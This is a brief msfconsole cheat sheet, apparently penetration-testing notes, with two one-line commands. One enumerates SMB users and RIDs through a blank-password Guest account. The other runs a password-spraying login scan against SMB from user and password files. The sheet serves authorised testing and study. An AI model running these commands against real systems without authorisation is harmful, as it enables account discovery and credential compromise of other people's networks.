## msfconsole

### Enumeration / Recon modules

#### SMB / enumerating users

**Command - Using static guest account to enumerate users and role ID's**

```
msfconsole -q -x "use scanner/smb/smb_lookupsid;set rhosts <ip>;set MinRID 1000;set MaxRID 5000;set SMBUser Guest;set SMBPass ;set THREADS 10;set SMBDomain .;run;exit;"
```

**Command - Getting successful password spraying with enumerated users**

```
msfconsole -q -x "use scanner/smb/smb_login;set BLANK_PASSWORDS true;set ANONYMOUS_LOGIN true;set rhosts <ip>;set USER_AS_PASS true;set STOP_ON_SUCCESS true;set VERBOSE false;set PASS_FILE $(pwd)/<smb_pass.txt>; set USER_FILE $(pwd)/<file_users.txt>;run;exit;"
```